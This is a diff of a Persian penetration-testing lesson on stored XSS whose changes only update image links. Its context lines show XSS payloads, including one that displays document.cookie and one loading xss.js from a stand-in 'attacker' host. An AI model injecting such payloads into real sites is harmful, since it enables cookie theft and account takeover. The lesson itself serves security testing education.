@@ -69,7 +69,7 @@
 **مثال:** پست الکترونیکی داده‌ها را در index2.phpذخیره می‌کند.
   <div dir="ltr">
   
-![XSS](https://github.com/BugHunter021/penetration-test/blob/main/learn/persian/lesson-2/images/WSTG-INPV-02-01.png)
+![XSS](https://github.com/BugHunter021/penetration-test/blob/main/learn/persian/WSTG-INVP/leeson-2/images/1.2.png)
 <div dir="rtl">
 
 کد HTML مربوط به index2.php که در آن مقدار ایمیل قرار دارد:
@@ -91,7 +91,7 @@ aaa@aa.com%22%3E%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E
 اطمینان حاصل کنید که ورودی از طریق برنامه ارسال شده‌باشد. این معمولاً شامل غیرفعال کردن جاوا اسکریپت در صورتی که کنترل‌های امنیتی سمت کلاینت اجرا شود یا درخواست HTTP را با یک پروکسی وب تغییر می‌دهد. همچنین مهم است که همان تزریق را با هر دو درخواست HTTP GET و POST آزمایش کنید. تزریق بالا منجر به نمایش یک پنجره popup حاوی مقادیر کوکی می‌شود.
 <div dir="ltr">
 
-![XSS](https://github.com/BugHunter021/penetration-test/blob/main/learn/persian/lesson-2/images/5.1.png)
+![XSS](https://github.com/BugHunter021/penetration-test/blob/main/learn/persian/WSTG-INVP/leeson-2/images/5.1.png)
 <div dir="rtl">
 
 کد HTML پس از تزریق:
@@ -125,7 +125,7 @@ http://example/?var=<SCRIPT%20a=">"%20SRC="http://attacker/xss.js"></SCRIPT>
 هنگامی که کاربر صفحه index2.php را Load می‌کند، اسکریپت hook.js توسط مرورگر اجرا می‌شود. سپس امکان دسترسی به کوکی‌ها، screenshot کاربر، clipboard کاربر و راه‌اندازی حملات پیچیده XSS وجود دارد.
 <div dir="ltr">
 
-![XSS](https://github.com/BugHunter021/penetration-test/blob/main/learn/persian/lesson-2/images/8.1.png)
+![XSS](https://github.com/BugHunter021/penetration-test/blob/main/learn/persian/WSTG-INVP/leeson-2/images/8.1.png)
 <div dir="rtl">
 این حمله به ویژه در صفحات آسیب‌پذیر که توسط بسیاری از کاربران با امتیازات مختلف مشاهده می‌شوند، موثر است.
 
@@ -172,7 +172,7 @@ Content-Type: text/html
 جدول زیر برخی از متغیرها و توابع خاص را برای بررسی در هنگام تجزیه و تحلیل سورس کد نمایش می دهد:
 <div dir="ltr">
 
-![XSS](https://github.com/BugHunter021/penetration-test/blob/main/learn/persian/lesson-2/images/11.2.png)
+![XSS](https://github.com/BugHunter021/penetration-test/blob/main/learn/persian/WSTG-INVP/leeson-2/images/11.2.png)
 <div dir="rtl">
 
 *نکته:* جدول بالا تنها خلاصه‌ای از مهم‌ترین پارامترها بوده و البته تمام پارامترهای ورودی کاربر باید بررسی شوند.
